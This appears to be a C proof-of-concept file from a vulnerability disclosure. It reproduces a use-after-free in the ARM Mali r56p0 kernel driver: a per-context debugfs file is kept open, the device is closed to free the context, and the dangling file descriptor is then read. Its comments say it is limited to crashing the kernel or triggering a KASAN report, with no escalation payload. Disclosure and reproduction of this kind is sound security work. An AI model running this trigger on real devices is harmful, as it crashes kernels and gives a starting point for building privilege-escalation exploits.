// SPDX-License-Identifier: MIT
/*
 * poc_debugfs_kctx_uaf.c — Mali CSF r56p0 per-kctx debugfs UAF reproduction
 *
 * BUG CLASS:  use-after-free (CWE-416) — deterministic
 * TARGET:     ARM Mali Midgard/CSF kernel driver, AX504X08X-SW-99002-r56p0
 *             (and any release sharing the same kctx-debugfs pattern)
 *
 * ROOT CAUSE (one sentence):
 *   Every debugfs file created under kctx->kctx_dentry is opened with
 *   i_private == kctx, but kbase_context_debugfs_term() /
 *   debugfs_remove_recursive() does not invalidate already-open fds before
 *   kbase_destroy_context() -> vfree(kctx). Only debug_mem_view (read mode)
 *   and mem_migrate auquire get_file_active(&kctx->filp); all other
 *   per-kctx files dereference the freed kctx (lock a mutex inside the
 *   freed object, then walk context lists) on the next read()/write().
 *
 * REPRODUCTION (single process, deterministic, no race):
 *   1. open /dev/mali0
 *   2. ioctl(KBASE_IOCTL_MEM_PROFILE_ADD) — creates mem_profile debugfs
 *      node with i_private = kctx and attacker-supplied backing buffer
 *   3. open the debugfs file, KEEP the fd
 *   4. close the device fd  -> kbase_release -> vfree(kctx)
 *   5. read() the still-open debugfs fd -> UAF: lock on freed
 *      kctx->mem_profile_lock, seq_write from freed kctx->mem_profile_data
 *
 *   Under KASAN: "slab-use-after-free READ" at kbasep_mem_profile_seq_show
 *   / seq_write, stack showing the debugfs reader vs the vfree(kctx) in
 *   kbase_context_free.
 *
 * SCOPE (disclosure PoC only):
 *   - Crash / KASAN confirmation only.
 *   - NO heap spray, NO object replacement shaping, NO cred/function-pointer
 *     overwrite, NO privilege escalation payload of any kind.
 *
 * BUILD:
 *   gcc -O2 -o poc_debugfs_kctx_uaf poc_debugfs_kctx_uaf.c
 *
 * RUN (must be root: /sys/kernel/debug and the mem_profile file):
 *   ./poc_debugfs_kctx_uaf [--file mem_jit_count|mem_jit_vm|mem_jit_phys|...]
 *
 *   Default flow uses mem_profile via the KBASE_IOCTL_MEM_PROFILE_ADD
 *   ioctl; --file X opens one of the always-present per-kctx JIT files
 *   instead, which still exercises the same dangling-kctx class.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>

#define UNUSED(x) (x) __attribute__((unused))

/* ---- UAPI constants (mirrored from mali_kbase_ioctl.h) --------------------
 * KBASE_IOCTL_TYPE 0x80; MEM_PROFILE_ADD = _IOW(0x80, 27, struct mem_profile_add)
 */
#define KBASE_IOCTL_TYPE 0x80

struct kbase_ioctl_mem_profile_add {
	unsigned long long buffer; /* __u64 */
	unsigned int len;          /* __u32 */
	unsigned int padding;      /* __u32 */
};

/* _IOW with __u64+2x__u32 = 16 bytes */
#define KBASE_IOCTL_MEM_PROFILE_ADD \
	_IOC(_IOC_WRITE, KBASE_IOCTL_TYPE, 27, sizeof(struct kbase_ioctl_mem_profile_add))

#ifndef _IOC
#error "sys/ioctl.h must provide _IOC"
#endif

#define MAX_COOKIE_PATH 256

static int find_mali_device(char *out, size_t outsz)
{
	static const char *cands[] = { "/dev/mali0", "/dev/mali", NULL };
	DIR *d;
	struct dirent *e;
	size_t i;

	for (i = 0; cands[i]; i++) {
		struct stat st;
		if (stat(cands[i], &st) == 0) {
			strncpy(out, cands[i], outsz - 1)[outsz - 1] = '\0';
			return 0;
		}
	}

	/* Fall back to /dev scan for maliN minor devices */
	d = opendir("/dev");
	if (!d)
		return -1;
	while ((e = readdir(d))) {
		if (strncmp(e->d_name, "mali", 4) == 0) {
			snprintf(out, outsz, "/dev/%s", e->d_name);
			closedir(d);
			return 0;
		}
	}
	closedir(d);
	return -1;
}

/*
 * Locate the per-kctx debugfs directory: /sys/kernel/debug/<devname>/ctx/<tgid>_<id>
 * We scan for "<tgid>_*" under each device's ctx dir so we don't need to know
 * kctx->id.
 */
static int find_kctx_dir(char *out, size_t outsz, const char *devname)
{
	char path[MAX_COOKIE_PATH];
	DIR *d;
	struct dirent *e;
	struct stat st;
	int written;

	written = snprintf(path, sizeof(path), "/sys/kernel/debug/%s/ctx", devname);
	if (written <= 0 || (size_t)written >= sizeof(path))
		return -1;

	/* A single-device filesystem: devname dir directly under debugfs */
	if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
		d = opendir(path);
		if (!d)
			return -1;
		while ((e = readdir(d))) {
			char prefix[MAX_COOKIE_PATH];
			if (e->d_type != DT_DIR && e->d_type != DT_UNKNOWN)
				continue;
			snprintf(prefix, sizeof(prefix), "%d_", getpid());
			if (strncmp(e->d_name, prefix, strlen(prefix)) == 0) {
				snprintf(out, outsz, "%s/%s", path, e->d_name);
				closedir(d);
				return 0;
			}
		}
		closedir(d);
	}
	return -1;
}

static int do_mem_profile_flow(const char *dev_arg)
{
	(void)dev_arg;
	struct kbase_ioctl_mem_profile_add add;
	char dev[MAX_COOKIE_PATH / 2];
	char kctxdir[MAX_COOKIE_PATH];
	char filepath[MAX_COOKIE_PATH];
	char marker[] = "DISCLOSURE-PoC-MEMPROFILE";
	int mali_fd = -1, prof_fd = -1;

	if (find_mali_device(dev, sizeof(dev)) < 0) {
		fprintf(stderr, "[!] no /dev/maliN device found\n");
		return 1;
	}
	printf("[*] device: %s\n", dev);

	mali_fd = open(dev, O_RDWR);
	if (mali_fd < 0) {
		perror("open /dev/maliN");
		return 1;
	}

	/* Step 2 — create backing data + the debugfs file (i_private = kctx) */
	memset(&add, 0, sizeof(add));
	add.buffer = (unsigned long long)(uintptr_t)marker;
	add.len = (unsigned int)sizeof(marker);

	if (ioctl(mali_fd, KBASE_IOCTL_MEM_PROFILE_ADD, &add) < 0) {
		perror("ioctl(KBASE_IOCTL_MEM_PROFILE_ADD)");
		fprintf(stderr, "[!] MEM_PROFILE_ADD failed — cannot create mem_profile\n");
		close(mali_fd);
		return 1;
	}
	printf("[*] MEM_PROFILE_ADD ok (len=%u)\n", add.len);

	/* Determine the kctx debugfs dir (created at open; scanned by tgid) */
	if (find_kctx_dir(kctxdir, sizeof(kctxdir),
			  strrchr(dev, '/') + 1) < 0) {
		fprintf(stderr, "[!] kctx debugfs dir not found under /sys/kernel/debug/*/ctx\n");
		close(mali_fd);
		return 1;
	}
	printf("[*] kctx debugfs dir: %s\n", kctxdir);

	snprintf(filepath, sizeof(filepath), "%s/mem_profile", kctxdir);
	printf("[*] opening %s (keep the fd while we free kctx)\n", filepath);
	prof_fd = open(filepath, O_RDONLY);
	if (prof_fd < 0) {
		perror("open mem_profile");
		close(mali_fd);
		return 1;
	}

	/* Step 4 — close the device fd: kctx is vfree()d NOW */
	close(mali_fd);
	printf("[*] device fd closed — kctx is freed (vfree)\n");

	/* Step 5 — read() the dangling file: UAF on kctx */
	{
		char buf[512];
		ssize_t n;

		printf("[*] reading dangling debugfs fd (KASAN should fire here)\n");
		n = read(prof_fd, buf, sizeof(buf));
		if (n < 0)
			printf("[-] read() returned %zd: %s "
			       "(read raced fine — group lifetime OK)\n", n, strerror(errno));
		else
			printf("[+] read() returned %zd bytes (UAF read from freed kctx)\n", n);
	}

	close(prof_fd);
	return 0;
}

/*
 * Variant B — always-present per-kctx JIT files: no MEM_PROFILE_ADD needed.
 * kbase_jit_debugfs_open() stores data->kctx = inode->i_private (mem.c:2346)
 * and the show path mutex_lock(&kctx->jit_evict_lock) on the freed object.
 */
static int do_jit_file_flow(const char *fname)
{
	char dev[MAX_COOKIE_PATH / 2];
	char kctxdir[MAX_COOKIE_PATH];
	char filepath[MAX_COOKIE_PATH];
	int mali_fd = -1, dbg_fd = -1;

	if (find_mali_device(dev, sizeof(dev)) < 0) {
		fprintf(stderr, "[!] no /dev/maliN device found\n");
		return 1;
	}

	mali_fd = open(dev, O_RDWR);
	if (mali_fd < 0) {
		perror("open /dev/maliN");
		return 1;
	}

	if (find_kctx_dir(kctxdir, sizeof(kctxdir), strrchr(dev, '/') + 1) < 0) {
		fprintf(stderr, "[!] kctx debugfs dir not found\n");
		close(mali_fd);
		return 1;
	}

	snprintf(filepath, sizeof(filepath), "%s/%s", kctxdir, fname);
	printf("[*] opening %s\n", filepath);
	dbg_fd = open(filepath, O_RDONLY);
	if (dbg_fd < 0) {
		perror("open jit debugfs");
		close(mali_fd);
		return 1;
	}

	close(mali_fd);
	printf("[*] device fd closed — reading dangling %s fd\n", fname);
	{
		char buf[256];
		ssize_t n = read(dbg_fd, buf, sizeof(buf));
		if (n < 0)
			printf("[-] read() error: %s\n", strerror(errno));
		else
			printf("[+] read %zd bytes — UAF read from freed kctx\n", n);
	}
	close(dbg_fd);
	return 0;
}

int main(int argc, char **argv)
{
	const char *file = NULL;
	(void)argc;

	if (geteuid() != 0) {
		fprintf(stderr, "[!] run as root (debugfs perms for /sys/kernel/debug/mali*/)\n");
	}

	for (int i = 1; i < argc; i++) {
		if (!strncmp(argv[i], "--file", 7) && i + 1 < argc)
			file = argv[++i];
	}

	if (file)
		return do_jit_file_flow(file);

	printf("[*] Mali r56p0 mem_profile debugfs UAF — crash-only PoC (no escalation)\n");
	return do_mem_profile_flow(NULL);
}
